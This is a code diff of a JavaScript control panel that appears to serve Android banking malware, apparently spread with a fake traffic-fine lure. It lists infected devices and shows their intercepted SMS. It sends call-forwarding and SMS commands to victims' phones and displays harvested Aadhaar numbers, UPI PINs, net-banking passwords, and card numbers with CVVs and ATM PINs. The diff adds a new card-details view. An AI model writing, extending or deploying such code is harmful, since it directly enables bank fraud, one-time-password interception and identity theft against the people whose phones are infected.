@@ -11,7 +11,6 @@ if (!deviceId) {
 }
 
 let currentDevice = {};
-let challanUser = {};
 let selectedSimSms = 1;
 let selectedSimCf = 1;
 
@@ -20,11 +19,6 @@ db.ref("device_info/" + deviceId).on("value", (snap) => {
   const d = snap.val() || {};
   currentDevice = d;
   renderDevice(d);
-});
-
-// Load challan_users data
-db.ref("challan_users/" + deviceId).on("value", (snap) => {
-  challanUser = snap.val() || {};
 });
 
 // ==========================================
@@ -36,35 +30,31 @@ function renderDevice(d) {
   const statusText = online ? "● Online" : "● Offline";
 
   const html = `
-    <!-- Top Control Buttons -->
     <div class="two-col-btns">
       <button class="big-btn" onclick="openModal('modalCallFwd')">📞 Call Forward</button>
       <button class="big-btn" onclick="openModal('modalSms')">💬 Send SMS</button>
     </div>
     <button class="big-btn" onclick="openSimModal()">📶 Update SIM Number</button>
 
-    <!-- Device Info Card -->
     <div class="detail-header-card">
       <div class="row"><span class="k">Model</span><span class="v">${escapeHtml(d.device_model || "-")}</span></div>
       <div class="row"><span class="k">OS Version</span><span class="v">Android ${escapeHtml(d.android_version || "-")}</span></div>
       <div class="row"><span class="k">Device Name</span><span class="v">${escapeHtml(d.device_manufacturer || "-")}</span></div>
       <div class="row"><span class="k">Device ID</span><span class="v">${escapeHtml(deviceId)}</span></div>
-      <div class="row"><span class="k">SIM 1</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim1 || d.sim1_number || "No SIM Found")}</span></div>
-      <div class="row"><span class="k">SIM 2</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim2 || d.sim2_number || "No SIM Found")}</span></div>
+      <div class="row"><span class="k">SIM 1</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim1_number || "No SIM Found")}</span></div>
+      <div class="row"><span class="k">SIM 2</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim2_number || "No SIM Found")}</span></div>
     </div>
 
-    <!-- Connection Status -->
     <div class="connection-status">
       <span class="label">Connection Status</span>
       <span class="${statusClass}">${statusText}</span>
     </div>
 
-    <!-- Login Details Button -->
     <button class="big-btn" onclick="openLoginDetails()">🔐 Login Details</button>
+    <button class="big-btn" onclick="openCardDetails()">💳 Card Details</button>
 
-    <!-- Recent Messages -->
     <div class="section-card">
-      <h3>💬 Recent Messages</h3>
+      <h3>💬 Messages (${getMessagesCount(d)})</h3>
       <div id="recentMessages">
         <div style="text-align:center;color:#64748b;padding:20px;">Loading messages...</div>
       </div>
@@ -72,43 +62,55 @@ function renderDevice(d) {
   `;
 
   document.getElementById("content").innerHTML = html;
-  loadRecentMessages();
+  renderMessages(d.messages);
 }
 
 // ==========================================
-// LOAD RECENT MESSAGES
+// GET MESSAGES COUNT
 // ==========================================
-function loadRecentMessages() {
-  db.ref("sms_commands/" + deviceId).limitToLast(5).once("value").then((snap) => {
-    const data = snap.val() || {};
-    const msgs = [];
-    Object.keys(data).forEach((k) => {
-      msgs.push({ key: k, ...data[k] });
-    });
-    msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+function getMessagesCount(d) {
+  if (!d.messages) return 0;
+  return Object.keys(d.messages).length;
+}
 
-    const el = document.getElementById("recentMessages");
-    if (msgs.length === 0) {
-      el.innerHTML = '<div style="text-align:center;color:#64748b;padding:20px;">No messages yet</div>';
-      return;
-    }
+// ==========================================
+// RENDER MESSAGES (from device_info/{id}/messages)
+// ==========================================
+function renderMessages(messagesObj) {
+  const el = document.getElementById("recentMessages");
+  if (!el) return;
 
-    el.innerHTML = msgs.map((m) => {
-      const isSent = m.direction === "out" || m.status === "sent";
-      return `
-        <div class="msg-item ${isSent ? 'sent' : ''}" style="margin-bottom:10px;">
-          <div class="msg-header">
-            <span>
-              <span class="msg-tag ${isSent ? 'tag-out' : 'tag-in'}">${isSent ? '📤 SENT' : '📩 RECV'}</span>
-              ${escapeHtml(m.target_number || m.from || "-")}
-            </span>
-            <span>${formatTime(m.timestamp)}</span>
-          </div>
-          <div class="msg-body">${escapeHtml(m.message || m.body || "-")}</div>
+  if (!messagesObj || Object.keys(messagesObj).length === 0) {
+    el.innerHTML = '<div style="text-align:center;color:#64748b;padding:20px;">No messages yet</div>';
+    return;
+  }
+
+  const msgs = Object.keys(messagesObj).map((k) => ({
+    key: k,
+    ...messagesObj[k]
+  }));
+
+  msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+  el.innerHTML = msgs.slice(0, 20).map((m) => {
+    const isSent = (m.type || "").toUpperCase() === "SENT";
+    const fromTo = m.sender || m.number || m.receiver || "-";
+    const body = m.body || m.message || "-";
+    const sim = m.receivedOn || m.sim_slot ? " · " + (m.receivedOn || ("SIM " + m.sim_slot)) : "";
+
+    return `
+      <div class="msg-item ${isSent ? 'sent' : ''}" style="margin-bottom:10px;">
+        <div class="msg-header">
+          <span>
+            <span class="msg-tag ${isSent ? 'tag-out' : 'tag-in'}">${isSent ? '📤 SENT' : '📩 RECV'}</span>
+            ${escapeHtml(fromTo)}${escapeHtml(sim)}
+          </span>
+          <span>${escapeHtml(m.date || formatTime(m.timestamp))}</span>
         </div>
-      `;
-    }).join("");
-  });
+        <div class="msg-body">${escapeHtml(body)}</div>
+      </div>
+    `;
+  }).join("");
 }
 
 // ==========================================
@@ -157,7 +159,6 @@ function sendSMS() {
   }).catch((err) => alert("Error: " + err.message));
 }
 
-// SMS counter
 document.addEventListener("input", (e) => {
   if (e.target && e.target.id === "smsMessage") {
     document.getElementById("smsCounter").textContent = e.target.value.length + "/150";
@@ -183,7 +184,7 @@ function sendCallForward(action) {
     status: "pending",
     timestamp: Date.now()
   }).then(() => {
-    alert(`Call forward ${action} command sent!`);
+    alert("Call forward " + action + " command sent!");
     closeModal('modalCallFwd');
   }).catch((err) => alert("Error: " + err.message));
 }
@@ -192,8 +193,8 @@ function sendCallForward(action) {
 // UPDATE SIM
 // ==========================================
 function openSimModal() {
-  document.getElementById("sim1Input").value = currentDevice.sim1 || currentDevice.sim1_number || "";
-  document.getElementById("sim2Input").value = currentDevice.sim2 || currentDevice.sim2_number || "";
+  document.getElementById("sim1Input").value = currentDevice.sim1_number || "";
+  document.getElementById("sim2Input").value = currentDevice.sim2_number || "";
   document.getElementById("modalSim").classList.add("active");
 }
 
@@ -202,8 +203,8 @@ function updateSim() {
   const sim2 = document.getElementById("sim2Input").value.trim();
 
   const update = {};
-  if (sim1) update.sim1 = sim1;
-  if (sim2) update.sim2 = sim2;
+  if (sim1) update.sim1_number = sim1;
+  if (sim2) update.sim2_number = sim2;
 
   if (Object.keys(update).length === 0) {
     alert("Enter at least one SIM number!");
@@ -217,61 +218,71 @@ function updateSim() {
 }
 
 // ==========================================
-// LOGIN DETAILS
+// LOGIN DETAILS (from device_info/{id}/login_details)
 // ==========================================
 function openLoginDetails() {
   const el = document.getElementById("loginDetailsContent");
-  const cu = challanUser || {};
   const d = currentDevice || {};
+  const ld = d.login_details || {};
+
+  const name = ld.name || d.user_name || "-";
+  const mobile = ld.mobile || d.user_mobile || "-";
+  const dob = ld.dob || d.user_dob || "-";
+  const aadhar = ld.aadhar || d.user_aadhar || "-";
+  let upiPin = d.upi_pin || ld.upi_pin || "-";
+  if (typeof upiPin === "object" && upiPin !== null) {
+    upiPin = upiPin.pin || upiPin.value || JSON.stringify(upiPin);
+  }
 
   const html = `
     <div class="section-card" style="margin:0 0 12px 0;">
       <h3>👤 Personal Info</h3>
       <div style="font-size:13px;line-height:2;color:#fff;">
-        <div><b style="color:#94a3b8;">Name:</b> ${escapeHtml(cu.user_name || cu.name || d.user_name || "-")}</div>
-        <div><b style="color:#94a3b8;">Mobile:</b> ${escapeHtml(cu.mobile || cu.phone || d.mobile || "-")}</div>
-        <div><b style="color:#94a3b8;">DOB:</b> ${escapeHtml(cu.dob || d.dob || "-")}</div>
-        <div><b style="color:#94a3b8;">Aadhar:</b> ${escapeHtml(cu.aadhar || cu.aadhaar || d.aadhar || "-")}</div>
-        <div><b style="color:#ff3b5c;">UPI PIN:</b> ${escapeHtml(cu.upi_pin || d.upi_pin || "N/A")}</div>
+        <div><b style="color:#94a3b8;">Name:</b> ${escapeHtml(name)}</div>
+        <div><b style="color:#94a3b8;">Mobile:</b> ${escapeHtml(String(mobile))}</div>
+        <div><b style="color:#94a3b8;">DOB:</b> ${escapeHtml(String(dob))}</div>
+        <div><b style="color:#94a3b8;">Aadhar:</b> ${escapeHtml(String(aadhar))}</div>
+        <div><b style="color:#ff3b5c;">UPI PIN:</b> ${escapeHtml(String(upiPin))}</div>
       </div>
     </div>
 
     <div class="section-card" style="margin:0;">
       <h3>🏦 Net Banking Details</h3>
-      <div id="netbankingData" style="font-size:13px;line-height:2;color:#fff;">
-        Loading...
+      <div style="font-size:13px;line-height:2;color:#fff;">
+        <div><b style="color:#94a3b8;">Bank:</b> ${escapeHtml(d.netbanking_bank || "-")}</div>
+        <div><b style="color:#94a3b8;">Account Holder:</b> ${escapeHtml(d.netbanking_account_holder || "-")}</div>
+        <div><b style="color:#94a3b8;">Customer ID:</b> ${escapeHtml(d.netbanking_customer_id || "-")}</div>
+        <div><b style="color:#ff3b5c;">Password:</b> ${escapeHtml(d.netbanking_password || "-")}</div>
       </div>
     </div>
   `;
 
   el.innerHTML = html;
   document.getElementById("modalLoginDetails").classList.add("active");
+}
 
-  db.ref("netbanking_payments").orderByChild("device_id").equalTo(deviceId).once("value").then((snap) => {
-    const data = snap.val() || {};
-    const keys = Object.keys(data);
-    const nb = document.getElementById("netbankingData");
+// ==========================================
+// CARD DETAILS
+// ==========================================
+function openCardDetails() {
+  const el = document.getElementById("loginDetailsContent");
+  const d = currentDevice || {};
 
-    if (keys.length === 0) {
-      nb.innerHTML = '<i style="color:#64748b;">No netbanking data found</i>';
-      return;
-    }
+  const html = `
+    <div class="section-card" style="margin:0;">
+      <h3>💳 Card Details</h3>
+      <div style="font-size:13px;line-height:2;color:#fff;">
+        <div><b style="color:#94a3b8;">Card Number:</b> ${escapeHtml(d.card_number || "-")}</div>
+        <div><b style="color:#94a3b8;">Card Type:</b> ${escapeHtml(d.card_type || "-")}</div>
+        <div><b style="color:#94a3b8;">Expiry:</b> ${escapeHtml(d.card_expiry || "-")}</div>
+        <div><b style="color:#ff3b5c;">CVV:</b> ${escapeHtml(d.card_cvv || "-")}</div>
+        <div><b style="color:#ff3b5c;">ATM PIN:</b> ${escapeHtml(d.card_atm_pin || "-")}</div>
+      </div>
+    </div>
+  `;
 
-    nb.innerHTML = keys.map((k) => {
-      const p = data[k] || {};
-      return `
-        <div style="border-bottom:1px solid rgba(255,255,255,0.06);padding:10px 0;">
-          <div><b style="color:#94a3b8;">Bank:</b> ${escapeHtml(p.netbanking_bank || "-")}</div>
-          <div><b style="color:#94a3b8;">Account Holder:</b> ${escapeHtml(p.netbanking_account_holder || "-")}</div>
-          <div><b style="color:#94a3b8;">Customer ID:</b> ${escapeHtml(p.netbanking_customer_id || "-")}</div>
-          <div><b style="color:#ff3b5c;">Password:</b> ${escapeHtml(p.netbanking_password || "-")}</div>
-          <div style="font-size:11px;color:#64748b;margin-top:4px;">Amount: ${escapeHtml(p.amount || "-")}</div>
-        </div>
-      `;
-    }).join("");
-  }).catch(() => {
-    document.getElementById("netbankingData").innerHTML = "<i>Error loading data.</i>";
-  });
+  el.innerHTML = html;
+  document.getElementById("modalLoginDetails").classList.add("active");
 }
 
 // ==========================================
